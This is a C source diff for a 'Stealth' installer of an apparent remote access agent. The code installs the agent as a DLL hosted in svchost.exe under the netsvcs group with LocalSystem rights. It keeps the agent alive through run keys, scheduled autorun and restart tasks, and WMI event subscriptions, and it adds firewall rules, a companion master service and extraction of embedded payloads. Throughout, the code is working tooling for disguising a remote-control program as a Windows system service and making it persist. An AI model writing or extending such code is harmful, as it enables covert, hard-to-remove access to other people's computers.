+        if (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, discovery->serviceKeyPath, L"ImagePath", imagePath, _countof(imagePath), NULL))
+        {
+            wchar_t imagePathUpper[512] = {0};
+            StringCchCopyW(imagePathUpper, _countof(imagePathUpper), imagePath);
+            MeshInstaller_UppercaseInplace(imagePathUpper);
+            discovery->serviceImageValid = (wcsstr(imagePathUpper, L"SVCHOST.EXE") != NULL);
+            discovery->serviceGroupValid = (wcsstr(imagePathUpper, L"-K NETSVCS") != NULL);
+        }
+        discovery->serviceAccountValid = (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, discovery->serviceKeyPath, L"ObjectName", objectName, _countof(objectName), NULL) &&
+                                          _wcsicmp(objectName, L"LocalSystem") == 0);
+        discovery->serviceDllValid = (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, discovery->serviceParamsPath, L"ServiceDll", serviceDll, _countof(serviceDll), NULL) &&
+                                      _wcsicmp(serviceDll, discovery->paths.dllPath) == 0);
+        discovery->serviceMainValid = (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, discovery->serviceParamsPath, L"ServiceMain", serviceMain, _countof(serviceMain), NULL) &&
+                                       _wcsicmp(serviceMain, L"Stealth_SvchostServiceMain") == 0);
+        discovery->serviceUnloadValid = (Stealth_ReadRegistryDword(HKEY_LOCAL_MACHINE, discovery->serviceParamsPath, L"ServiceDllUnloadOnStop", &unloadValue) &&
+                                         unloadValue == 1);
+    }
+    discovery->serviceDaclValid = (discovery->serviceExists ? MeshService_ValidateServiceDaclByName(discovery->serviceKeyName, NULL, 0) : FALSE);
+    discovery->conflictingServiceAliasCount = (DWORD)Stealth_CollectConflictingServiceAliases(&discovery->paths, discovery->serviceKeyName, NULL, 0);
+    discovery->serviceAliasClean = (discovery->conflictingServiceAliasCount == 0);
+
+    wchar_t hostExePath[MAX_PATH] = {0};
+    const wchar_t* hostToValidate = NULL;
+    if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), discovery->paths.installDir, L"svchost.exe") &&
+        Stealth_PathExists(hostExePath))
+    {
+        hostToValidate = hostExePath;
+    }
+    else
+    {
+        hostToValidate = L"C:\\Windows\\System32\\svchost.exe";
+    }
+    discovery->firewallRulePresent = Stealth_CheckFirewallRuleExists(discovery->serviceKeyName);
+    discovery->firewallHealthy = (discovery->firewallRulePresent &&
+                                  Stealth_DoFirewallRulesMatch(discovery->serviceKeyName, hostToValidate, discovery->paths.exePath));
+
+    StealthPersistenceState persisted = {0};
+    discovery->persistenceStateExists = Stealth_LoadPersistenceState(&persisted);
+    discovery->runKeyPresent = Stealth_RunKeyValueExists(discovery->serviceKeyName, NULL, 0);
+
+    wchar_t prefixCandidates[10][STEALTH_TASK_NAME_MAX] = {0};
+    size_t prefixCount = Stealth_BuildTaskPrefixCandidates(
+        MeshConfig_GetPersistence(),
+        discovery->serviceDisplayName,
+        discovery->serviceKeyName,
+        prefixCandidates,
+        _countof(prefixCandidates));
+    wchar_t existingTask[STEALTH_TASK_NAME_MAX] = {0};
+    discovery->autorunTaskPresent = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-Autorun-", existingTask, _countof(existingTask));
+    discovery->restartTaskPresent = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-RestartOnStop-", existingTask, _countof(existingTask));
+    discovery->wmiSubscriptionPresent = FALSE;
+    if (!discovery->restartTaskPresent)
+    {
+        wchar_t filterName[128] = {0};
+        wchar_t consumerName[128] = {0};
+        discovery->wmiSubscriptionPresent = Stealth_FindWmiByPrefixCandidates(
+            prefixCandidates,
+            prefixCount,
+            filterName,
+            _countof(filterName),
+            consumerName,
+            _countof(consumerName));
+    }
+
+    discovery->persistenceHealthy = TRUE;
+    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
+    if (persistence != NULL)
+    {
+        if (!discovery->persistenceStateExists)
+        {
+            discovery->persistenceHealthy = FALSE;
+        }
+        if (persistence->runKey != 0 && !discovery->runKeyPresent)
+        {
+            discovery->persistenceHealthy = FALSE;
+        }
+        if (persistence->autorunTask.enabled && !discovery->autorunTaskPresent)
+        {
+            discovery->persistenceHealthy = FALSE;
+        }
+        if (persistence->restartTask.enabled && !(discovery->restartTaskPresent || discovery->wmiSubscriptionPresent))
+        {
+            discovery->persistenceHealthy = FALSE;
+        }
+    }
+
+    {
+        wchar_t updateStageDir[MAX_PATH] = {0};
+        wchar_t updateBackupDir[MAX_PATH] = {0};
+        if (MeshInstaller_CombinePath(updateStageDir, _countof(updateStageDir), discovery->stateDirPath, STEALTH_UPDATE_STAGE_DIR_NAME))
+        {
+            discovery->updateStageArtifactsPresent = Stealth_DirectoryHasEntries(updateStageDir);
+        }
+        if (MeshInstaller_CombinePath(updateBackupDir, _countof(updateBackupDir), discovery->stateDirPath, STEALTH_UPDATE_BACKUP_DIR_NAME))
+        {
+            discovery->updateBackupArtifactsPresent = Stealth_DirectoryHasEntries(updateBackupDir);
+        }
+    }
+    discovery->pendingUpdate = (Stealth_DataStoreValueExists(discovery->paths.dbPath, "PendingUpdate", NULL, 0, NULL) ||
+                                discovery->updateStageArtifactsPresent ||
+                                discovery->updateBackupArtifactsPresent);
+    discovery->nodeIdPresent = Stealth_DataStoreValueExists(discovery->paths.dbPath, "NodeID", NULL, 0, NULL);
+
+    discovery->masterServiceBinaryPresent = Stealth_PathExists(discovery->masterServicePath);
+    BOOL masterServiceManagedByAgent = discovery->masterServiceBinaryPresent;
+    wchar_t masterServiceImage[MAX_PATH * 4] = {0};
+    if (Stealth_QueryServiceImagePathW(STEALTH_MASTER_SERVICE_NAME, masterServiceImage, _countof(masterServiceImage)))
+    {
+        discovery->masterServiceRegistered = TRUE;
+        MeshInstaller_NormalizePathSeparators(masterServiceImage);
+        if (masterServiceImage[0] == L'"')
+        {
+            size_t imageLen = wcslen(masterServiceImage);
+            if (imageLen > 1)
+            {
+                memmove(masterServiceImage, masterServiceImage + 1, imageLen * sizeof(wchar_t));
+                wchar_t* closingQuote = wcschr(masterServiceImage, L'"');
+                if (closingQuote != NULL) { *closingQuote = L'\0'; }
+            }
+        }
+        discovery->masterServicePathValid = (_wcsicmp(masterServiceImage, discovery->masterServicePath) == 0);
+        if (discovery->masterServicePathValid)
+        {
+            masterServiceManagedByAgent = TRUE;
+        }
+    }
+    discovery->masterServiceRunning = (discovery->masterServiceRegistered ? Stealth_ServiceIsRunning(STEALTH_MASTER_SERVICE_NAME) : FALSE);
+    discovery->masterServicePipeReady = (discovery->masterServiceRunning ? Stealth_IsMasterServicePipeReady() : FALSE);
+
+    discovery->anyPersistenceArtifacts = (discovery->persistenceStateExists ||
+                                          discovery->runKeyPresent ||
+                                          discovery->autorunTaskPresent ||
+                                          discovery->restartTaskPresent ||
+                                          discovery->wmiSubscriptionPresent);
+    discovery->anyCompanionArtifacts = (discovery->masterServiceBinaryPresent ||
+                                        (discovery->masterServiceRegistered && discovery->masterServicePathValid) ||
+                                        (masterServiceManagedByAgent && discovery->masterServicePipeReady));
+    discovery->masterServiceHealthy = (!discovery->anyCompanionArtifacts ||
+                                       (discovery->masterServiceBinaryPresent &&
+                                        discovery->masterServiceRegistered &&
+                                        discovery->masterServicePathValid &&
+                                        (!discovery->masterServiceRunning || discovery->masterServicePipeReady)));
+
+    discovery->anyInstallArtifacts = (discovery->exeExists ||
+                                      discovery->dllExists ||
+                                      discovery->confExists ||
+                                      discovery->dbExists ||
+                                      discovery->serviceKeyExists ||
+                                      discovery->serviceExists ||
+                                      discovery->firewallRulePresent);
+
+    const BOOL filesystemHealthy = (discovery->installRootExists &&
+                                    discovery->logsDirExists &&
+                                    discovery->exeExists &&
+                                    discovery->dllExists &&
+                                    discovery->confExists &&
+                                    discovery->installRootDaclValid &&
+                                    discovery->logsDirDaclValid &&
+                                    discovery->exeDaclValid &&
+                                    discovery->configKeysValid);
+    const BOOL serviceHealthy = (discovery->serviceExists &&
+                                 discovery->serviceKeyExists &&
+                                 discovery->serviceTypeValid &&
+                                 discovery->serviceStartValid &&
+                                 discovery->serviceImageValid &&
+                                 discovery->serviceGroupValid &&
+                                 discovery->serviceAccountValid &&
+                                 discovery->serviceDllValid &&
+                                 discovery->serviceMainValid &&
+                                 discovery->serviceUnloadValid &&
+                                 discovery->serviceDaclValid &&
+                                 discovery->serviceAliasClean);
+    const BOOL uninstallResidue = (!discovery->serviceExists &&
+                                   (discovery->serviceKeyExists ||
+                                    discovery->exeExists ||
+                                    discovery->dllExists ||
+                                    discovery->confExists ||
+                                    discovery->dbExists ||
+                                    discovery->firewallRulePresent ||
+                                    discovery->anyPersistenceArtifacts));
+
+    if (!discovery->anyInstallArtifacts && !discovery->anyPersistenceArtifacts)
+    {
+        discovery->stateKind = STEALTH_LIFECYCLE_STATE_CLEAN;
+    }
+    else if (discovery->pendingUpdate)
+    {
+        discovery->stateKind = STEALTH_LIFECYCLE_STATE_PENDING_UPDATE;
+    }
+    else if (uninstallResidue)
+    {
+        discovery->stateKind = STEALTH_LIFECYCLE_STATE_UNINSTALL_RESIDUE;
+    }
+    else if (filesystemHealthy && serviceHealthy && discovery->firewallHealthy && discovery->persistenceHealthy)
+    {
+        discovery->stateKind = STEALTH_LIFECYCLE_STATE_HEALTHY;
+    }
+    else if (discovery->serviceExists || discovery->serviceKeyExists)
+    {
+        discovery->stateKind = STEALTH_LIFECYCLE_STATE_BROKEN;
+    }
+    else
+    {
+        discovery->stateKind = STEALTH_LIFECYCLE_STATE_PARTIAL;
+    }
+
+    return TRUE;
+}
+
+static BOOL Stealth_RunLifecycleOperation(StealthLifecycleRequest request, const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode)
+{
+    if (request != STEALTH_LIFECYCLE_REQUEST_UNINSTALL && !useSvchostMode)
+    {
+        Stealth_LogInstallEvent(L"[LIFECYCLE] Non-svchost lifecycle request rejected (%ls)", Stealth_LifecycleRequestToString(request));
+        return FALSE;
+    }
+
+    StealthLifecycleDiscovery discovery;
+    StealthLifecyclePlan plan;
+    if (!Stealth_DiscoverCurrentState(&discovery))
+    {
+        Stealth_LogInstallEvent(L"[LIFECYCLE] Failed to discover current lifecycle state");
+        return FALSE;
+    }
+    if (!Stealth_BuildTransitionPlan(&discovery, request, &plan))
+    {
+        Stealth_LogInstallEvent(L"[LIFECYCLE] Failed to build lifecycle transition plan");
+        return FALSE;
+    }
+
+    Stealth_LogLifecycleSnapshot(L"before", &discovery, &plan);
+
+    BOOL ok = FALSE;
+    switch (plan.action)
+    {
+        case STEALTH_LIFECYCLE_ACTION_NONE:
+            ok = TRUE;
+            break;
+        case STEALTH_LIFECYCLE_ACTION_INSTALL:
+            ok = Stealth_ApplyInstallFlow(sourceExePath, sourceDllPath, TRUE);
+            break;
+        case STEALTH_LIFECYCLE_ACTION_UPDATE:
+            ok = Stealth_ApplyUpdateFlow(sourceExePath, sourceDllPath, TRUE);
+            break;
+        case STEALTH_LIFECYCLE_ACTION_REPAIR:
+            ok = Stealth_ApplyRepairFlow(sourceExePath, sourceDllPath, TRUE);
+            break;
+        case STEALTH_LIFECYCLE_ACTION_UNINSTALL:
+            ok = Stealth_ApplyUninstallFlow();
+            break;
+        default:
+            ok = FALSE;
+            break;
+    }
+
+    StealthLifecycleDiscovery postState;
+    if (Stealth_DiscoverCurrentState(&postState))
+    {
+        Stealth_LogLifecycleSnapshot(ok ? L"after" : L"after-failed", &postState, &plan);
+    }
+
+    return ok;
+}
+
+BOOL Stealth_PerformCompleteInstallation(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode)
+{
+    return Stealth_RunLifecycleOperation(STEALTH_LIFECYCLE_REQUEST_INSTALL, sourceExePath, sourceDllPath, useSvchostMode);
+}
+
+BOOL Stealth_PerformCompleteUninstallation(void)
+{
+    return Stealth_RunLifecycleOperation(STEALTH_LIFECYCLE_REQUEST_UNINSTALL, NULL, NULL, TRUE);
+}
+
+BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode)
+{
+    return Stealth_RunLifecycleOperation(STEALTH_LIFECYCLE_REQUEST_UPDATE, sourceExePath, sourceDllPath, useSvchostMode);
+}
+
 static BOOL Stealth_ExtractEmbeddedMshFromExe(const wchar_t* exePath, const wchar_t* destPath)
 {
     if (exePath == NULL || exePath[0] == L'\0' || destPath == NULL || destPath[0] == L'\0') { return FALSE; }
@@ -2474,6 +4873,18 @@ static BOOL Stealth_ExtractEmbeddedMshFromExe(const wchar_t* exePath, const wcha
 
     FILE* src = NULL;
     if (_wfopen_s(&src, exePath, L"rb") != 0 || src == NULL) { return FALSE; }
+
+    if (fseek(src, 0, SEEK_END) != 0)
+    {
+        fclose(src);
+        return FALSE;
+    }
+    long fileLen = ftell(src);
+    if (fileLen < 20)
+    {
+        fclose(src);
+        return FALSE;
+    }
 
     if (fseek(src, -16, SEEK_END) != 0)
     {
@@ -2502,13 +4913,14 @@ static BOOL Stealth_ExtractEmbeddedMshFromExe(const wchar_t* exePath, const wcha
     }
 
     unsigned int mshLen = (lenBuf[0] << 24) | (lenBuf[1] << 16) | (lenBuf[2] << 8) | lenBuf[3];
-    if (mshLen == 0)
+    if (mshLen == 0 || ((unsigned long)mshLen + 20UL) > (unsigned long)fileLen)
     {
         fclose(src);
         return FALSE;
     }
 
-    if (fseek(src, -(long)(20 + mshLen), SEEK_END) != 0)
+    long payloadOffset = fileLen - 20 - (long)mshLen;
+    if (payloadOffset < 0 || fseek(src, payloadOffset, SEEK_SET) != 0)
     {
         fclose(src);
         return FALSE;
@@ -2540,6 +4952,61 @@ static BOOL Stealth_ExtractEmbeddedMshFromExe(const wchar_t* exePath, const wcha
     return ok;
 }
 
+static BOOL Stealth_HasEmbeddedMshPayload(const wchar_t* exePath)
+{
+    if (exePath == NULL || exePath[0] == L'\0') { return FALSE; }
+
+    static const unsigned char kMshGuid[16] = {
+        0xB9, 0x96, 0x01, 0x58, 0x80, 0x54, 0x4A, 0x19,
+        0xB7, 0xF7, 0xE9, 0xBE, 0x44, 0x91, 0x4C, 0x19
+    };
+
+    FILE* src = NULL;
+    if (_wfopen_s(&src, exePath, L"rb") != 0 || src == NULL) { return FALSE; }
+
+    if (fseek(src, 0, SEEK_END) != 0)
+    {
+        fclose(src);
+        return FALSE;
+    }
+    long fileLen = ftell(src);
+    if (fileLen < 20)
+    {
+        fclose(src);
+        return FALSE;
+    }
+
+    if (fseek(src, -16, SEEK_END) != 0)
+    {
+        fclose(src);
+        return FALSE;
+    }
+
+    unsigned char guid[16] = {0};
+    if (fread(guid, 1, sizeof(guid), src) != sizeof(guid) || memcmp(guid, kMshGuid, sizeof(guid)) != 0)
+    {
+        fclose(src);
+        return FALSE;
+    }
+
+    if (fseek(src, -20, SEEK_END) != 0)
+    {
+        fclose(src);
+        return FALSE;
+    }
+
+    unsigned char lenBuf[4] = {0};
+    if (fread(lenBuf, 1, sizeof(lenBuf), src) != sizeof(lenBuf))
+    {
+        fclose(src);
+        return FALSE;
+    }
+
+    unsigned int mshLen = (lenBuf[0] << 24) | (lenBuf[1] << 16) | (lenBuf[2] << 8) | lenBuf[3];
+    fclose(src);
+    return (mshLen != 0 && ((unsigned long)mshLen + 20UL) <= (unsigned long)fileLen);
+}
+
 static BOOL Stealth_CopyFileIfPresent(const wchar_t* sourcePath, const wchar_t* destPath)
 {
     if (sourcePath == NULL || destPath == NULL) { return FALSE; }
@@ -2550,12 +5017,173 @@ static BOOL Stealth_CopyFileIfPresent(const wchar_t* sourcePath, const wchar_t* 
     return (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES);
 }
 
+static BOOL Stealth_TryStageAndValidateSvchostDll(const wchar_t* candidatePath, const wchar_t* destPath, const wchar_t* sourceLabel)
+{
+    if (candidatePath == NULL || candidatePath[0] == L'\0' || destPath == NULL || destPath[0] == L'\0') { return FALSE; }
+
+    DWORD attrs = GetFileAttributesW(candidatePath);
+    if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0)
+    {
+        return FALSE;
+    }
+
+    if (_wcsicmp(candidatePath, destPath) == 0)
+    {
+        if (Stealth_ValidateSvchostPayloadDll(destPath))
+        {
+            return TRUE;
+        }
+        Stealth_LogInstallEvent(L"Svchost DLL candidate failed validation in place (%ls)", candidatePath);
+        return FALSE;
+    }
+
+    Stealth_DeleteFileIfPresent(destPath);
+    if (!Stealth_CopyFileOverwrite(candidatePath, destPath))
+    {
+        Stealth_LogInstallEvent(L"Failed to stage svchost DLL from %ls (%ls -> %ls)", sourceLabel != NULL ? sourceLabel : L"candidate", candidatePath, destPath);
+        return FALSE;
+    }
+
+    if (Stealth_ValidateSvchostPayloadDll(destPath))
+    {
+        return TRUE;
+    }
+
+    Stealth_LogInstallEvent(L"Svchost DLL candidate from %ls failed validation (%ls)", sourceLabel != NULL ? sourceLabel : L"candidate", candidatePath);
+    Stealth_DeleteFileIfPresent(destPath);
+    return FALSE;
+}
+
+static BOOL Stealth_ExtractEmbeddedSvchostDllFromExe(const wchar_t* exePath, const wchar_t* destPath)
+{
+    BOOL ok = FALSE;
+    HMODULE moduleHandle = NULL;
+    HRSRC resourceInfo = NULL;
+    HGLOBAL resourceHandle = NULL;
+    const void* resourceData = NULL;
+    DWORD resourceSize = 0;
+    FILE* dst = NULL;
+    LPCWSTR rcDataType = MAKEINTRESOURCEW(10);
+
+    if (exePath == NULL || exePath[0] == L'\0' || destPath == NULL || destPath[0] == L'\0') { return FALSE; }
+
+    moduleHandle = LoadLibraryExW(exePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
+    if (moduleHandle == NULL) { return FALSE; }
+
+    resourceInfo = FindResourceW(moduleHandle, MAKEINTRESOURCEW(IDR_SVCHOST_DLL), rcDataType);
+    if (resourceInfo == NULL) { goto cleanup; }
+
+    resourceHandle = LoadResource(moduleHandle, resourceInfo);
+    if (resourceHandle == NULL) { goto cleanup; }
+
+    resourceData = LockResource(resourceHandle);
+    resourceSize = SizeofResource(moduleHandle, resourceInfo);
+    if (resourceData == NULL || resourceSize == 0) { goto cleanup; }
+
+    SetFileAttributesW(destPath, FILE_ATTRIBUTE_NORMAL);
+    if (_wfopen_s(&dst, destPath, L"wb") != 0 || dst == NULL) { goto cleanup; }
+    if (fwrite(resourceData, 1, resourceSize, dst) != resourceSize) { goto cleanup; }
+
+    ok = TRUE;
+
+cleanup:
+    if (dst != NULL)
+    {
+        fclose(dst);
+        dst = NULL;
+    }
+    if (!ok)
+    {
+        Stealth_DeleteFileIfPresent(destPath);
+    }
+    if (moduleHandle != NULL)
+    {
+        FreeLibrary(moduleHandle);
+    }
+    return ok;
+}
+
+static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, const wchar_t* destPath)
+{
+    wchar_t candidatePath[MAX_PATH * 4] = {0};
+    wchar_t brandedDllName[MAX_PATH] = {0};
+    BOOL packageProvided = (sourceExePath != NULL && sourceExePath[0] != L'\0');
+
+    if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
+
+    if (sourceDllPath != NULL && sourceDllPath[0] != L'\0')
+    {
+        if (Stealth_TryStageAndValidateSvchostDll(sourceDllPath, destPath, L"explicit package DLL"))
+        {
+            return TRUE;
+        }
+    }
+
+    if (packageProvided)
+    {
+        if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".dll", candidatePath, _countof(candidatePath)) &&
+            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(candidatePath, sourceDllPath) != 0) &&
+            Stealth_TryStageAndValidateSvchostDll(candidatePath, destPath, L"package same-basename DLL"))
+        {
+            return TRUE;
+        }
+
+        Stealth_DeleteFileIfPresent(destPath);
+        if (Stealth_ExtractEmbeddedSvchostDllFromExe(sourceExePath, destPath) && Stealth_ValidateSvchostPayloadDll(destPath))
+        {
+            return TRUE;
+        }
+
+        MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), brandedDllName, _countof(brandedDllName));
+        if (brandedDllName[0] != L'\0' &&
+            Stealth_BuildSiblingPathWithFileName(sourceExePath, brandedDllName, candidatePath, _countof(candidatePath)) &&
+            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(candidatePath, sourceDllPath) != 0) &&
+            Stealth_TryStageAndValidateSvchostDll(candidatePath, destPath, L"package sibling branded DLL"))
+        {
+            return TRUE;
+        }
+
+        if (Stealth_BuildSiblingPathWithFileName(sourceExePath, STEALTH_FALLBACK_DLL_NAME, candidatePath, _countof(candidatePath)) &&
+            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(candidatePath, sourceDllPath) != 0) &&
+            (brandedDllName[0] == L'\0' || _wcsicmp(candidatePath, brandedDllName) != 0) &&
+            Stealth_TryStageAndValidateSvchostDll(candidatePath, destPath, L"package sibling fallback DLL"))
+        {
+            return TRUE;
+        }
+
+        Stealth_DeleteFileIfPresent(destPath);
+        Stealth_LogInstallEvent(L"Package did not provide a valid svchost DLL payload (%ls)", sourceExePath);
+        return FALSE;
+    }
+
+    Stealth_DeleteFileIfPresent(destPath);
+    if (!MeshSvchostPayload_WriteToPath(destPath))
+    {
+        Stealth_LogInstallEvent(L"Failed to stage embedded svchost payload to %ls (error=%lu)", destPath, GetLastError());
+        return FALSE;
+    }
+    if (!Stealth_ValidateSvchostPayloadDll(destPath))
+    {
+        Stealth_DeleteFileIfPresent(destPath);
+        return FALSE;
+    }
+    return TRUE;
+}
+
 static BOOL Stealth_EnsureConfigFile(const wchar_t* sourceExePath, const wchar_t* destPath)
 {
     if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
     if (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
     if (sourceExePath != NULL && sourceExePath[0] != L'\0')
     {
+        wchar_t confPath[MAX_PATH * 4] = {0};
+        if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".conf", confPath, _countof(confPath)) &&
+            Stealth_CopyFileIfPresent(confPath, destPath) &&
+            Stealth_ConfigHasRequiredKeys(destPath))
+        {
+            return TRUE;
+        }
+
         wchar_t mshPath[MAX_PATH] = {0};
         StringCchCopyW(mshPath, _countof(mshPath), sourceExePath);
         wchar_t* dot = wcsrchr(mshPath, L'.');
@@ -2609,6 +5237,112 @@ static BOOL Stealth_EnsureMshFile(const wchar_t* sourceExePath, const wchar_t* d
     return (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES && Stealth_ConfigHasRequiredKeys(destPath));
 }
 
+BOOL Stealth_PreflightPackageSource(
+    const wchar_t* sourceExePath,
+    BOOL allowInstalledFallback,
+    BOOL requireConfig,
+    StealthPackagePreflight* summary,
+    wchar_t* failureReason,
+    size_t failureReasonCch)
+{
+    StealthPackagePreflight localSummary;
+    StealthPackagePreflight* target = (summary != NULL) ? summary : &localSummary;
+    ZeroMemory(target, sizeof(*target));
+    if (failureReason != NULL && failureReasonCch > 0) { failureReason[0] = L'\0'; }
+
+    if (sourceExePath == NULL || sourceExePath[0] == L'\0')
+    {
+        if (failureReason != NULL && failureReasonCch > 0)
+        {
+            (void)StringCchCopyW(failureReason, failureReasonCch, L"source executable path was not provided");
+        }
+        return FALSE;
+    }
+
+    DWORD sourceAttrs = GetFileAttributesW(sourceExePath);
+    if (sourceAttrs == INVALID_FILE_ATTRIBUTES || (sourceAttrs & FILE_ATTRIBUTE_DIRECTORY) != 0)
+    {
+        if (failureReason != NULL && failureReasonCch > 0)
+        {
+            (void)StringCchPrintfW(failureReason, failureReasonCch, L"source executable is missing: %ls", sourceExePath);
+        }
+        return FALSE;
+    }
+
+    target->sourceExePresent = TRUE;
+    target->sourceEmbeddedConfigPresent = Stealth_HasEmbeddedMshPayload(sourceExePath);
+
+    if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".msh", target->sourceMshPath, _countof(target->sourceMshPath)))
+    {
+        DWORD attrs = GetFileAttributesW(target->sourceMshPath);
+        target->sourceMshPresent = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
+        target->sourceMshValid = (target->sourceMshPresent ? Stealth_ConfigHasRequiredKeys(target->sourceMshPath) : FALSE);
+    }
+    if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".conf", target->sourceConfPath, _countof(target->sourceConfPath)))
+    {
+        DWORD attrs = GetFileAttributesW(target->sourceConfPath);
+        target->sourceConfPresent = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
+        target->sourceConfValid = (target->sourceConfPresent ? Stealth_ConfigHasRequiredKeys(target->sourceConfPath) : FALSE);
+    }
+    if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".db", target->sourceDbPath, _countof(target->sourceDbPath)))
+    {
+        DWORD attrs = GetFileAttributesW(target->sourceDbPath);
+        target->sourceDbPresent = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
+    }
+
+    if (allowInstalledFallback)
+    {
+        StealthInstallPaths paths;
+        ZeroMemory(&paths, sizeof(paths));
+        if (Stealth_GetInstallPaths(&paths))
+        {
+            if (paths.confPath[0] != L'\0' &&
+                SUCCEEDED(StringCchCopyW(target->existingConfPath, _countof(target->existingConfPath), paths.confPath)))
+            {
+                DWORD attrs = GetFileAttributesW(target->existingConfPath);
+                target->existingConfPresent = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
+                target->existingConfValid = (target->existingConfPresent ? Stealth_ConfigHasRequiredKeys(target->existingConfPath) : FALSE);
+            }
+            if (paths.exePath[0] != L'\0' &&
+                Stealth_BuildSiblingPathWithExtension(paths.exePath, L".msh", target->existingMshPath, _countof(target->existingMshPath)))
+            {
+                DWORD attrs = GetFileAttributesW(target->existingMshPath);
+                target->existingMshPresent = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
+                target->existingMshValid = (target->existingMshPresent ? Stealth_ConfigHasRequiredKeys(target->existingMshPath) : FALSE);
+            }
+        }
+    }
+
+    target->configAvailable = (target->sourceMshValid ||
+                               target->sourceConfValid ||
+                               target->sourceEmbeddedConfigPresent ||
+                               target->existingConfValid ||
+                               target->existingMshValid);
+    target->configFromExistingInstall = (!target->sourceMshValid &&
+                                         !target->sourceConfValid &&
+                                         !target->sourceEmbeddedConfigPresent &&
+                                         (target->existingConfValid || target->existingMshValid));
+
+    if (!requireConfig || target->configAvailable)
+    {
+        return TRUE;
+    }
+
+    if (failureReason != NULL && failureReasonCch > 0)
+    {
+        (void)StringCchPrintfW(
+            failureReason,
+            failureReasonCch,
+            L"no valid provisioning source was found for %ls (.msh=%u, .conf=%u, embedded=%u, existingFallback=%u)",
+            sourceExePath,
+            target->sourceMshValid,
+            target->sourceConfValid,
+            target->sourceEmbeddedConfigPresent,
+            target->configFromExistingInstall);
+    }
+    return FALSE;
+}
+
 static BOOL Stealth_ShouldEnableDebugConsole(void)
 {
     wchar_t flag[16] = {0};
@@ -2653,6 +5387,44 @@ static BOOL Stealth_ConfigHasRequiredKeys(const wchar_t* configPath)
     return ok;
 }
 
+static void Stealth_PrintJsonEscapedUtf8(const char* value)
+{
+    const unsigned char* cursor = (const unsigned char*)((value != NULL) ? value : "");
+    while (*cursor != '\0')
+    {
+        switch (*cursor)
+        {
+        case '\\': fputs("\\\\", stdout); break;
+        case '"': fputs("\\\"", stdout); break;
+        case '\n': fputs("\\n", stdout); break;
+        case '\r': fputs("\\r", stdout); break;
+        case '\t': fputs("\\t", stdout); break;
+        default: fputc(*cursor, stdout); break;
+        }
+        ++cursor;
+    }
+}
+
+static void Stealth_PrintJsonEscapedWide(const wchar_t* value)
+{
+    int needed = 0;
+    char* utf8 = NULL;
+
+    if (value == NULL || value[0] == L'\0') { return; }
+
+    needed = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
+    if (needed <= 0) { return; }
+
+    utf8 = (char*)malloc((size_t)needed);
+    if (utf8 == NULL) { return; }
+
+    if (WideCharToMultiByte(CP_UTF8, 0, value, -1, utf8, needed, NULL, NULL) > 0)
+    {
+        Stealth_PrintJsonEscapedUtf8(utf8);
+    }
+    free(utf8);
+}
+
 static void Stealth_PrintValidationJson(const StealthValidationSummary* summary)
 {
     if (summary == NULL) { return; }
@@ -2683,13 +5455,15 @@ static void Stealth_PrintValidationJson(const StealthValidationSummary* summary)
     printf("\"serviceUnload\":%s,", summary->serviceUnload ? "true" : "false");
     printf("\"serviceDllHash\":%s,", summary->serviceDllHash ? "true" : "false");
     printf("\"serviceDacl\":%s,", summary->serviceDacl ? "true" : "false");
+    printf("\"serviceAliasClean\":%s,", summary->serviceAliasClean ? "true" : "false");
     printf("\"serviceRunning\":%s,", summary->serviceRunning ? "true" : "false");
     printf("\"firewallRule\":%s,", summary->firewallRule ? "true" : "false");
     printf("\"persistenceState\":%s,", summary->persistenceState ? "true" : "false");
     printf("\"autorunTask\":%s,", summary->autorunTask ? "true" : "false");
     printf("\"restartTask\":%s,", summary->restartTask ? "true" : "false");
     printf("\"wmiSubscription\":%s,", summary->wmiSubscription ? "true" : "false");
-    printf("\"runKey\":%s", summary->runKey ? "true" : "false");
+    printf("\"runKey\":%s,", summary->runKey ? "true" : "false");
+    printf("\"pendingUpdateClear\":%s", summary->pendingUpdateClear ? "true" : "false");
     printf("}}\n");
 }
 
@@ -2703,10 +5477,13 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
 
     wchar_t serviceKeyName[256] = {0};
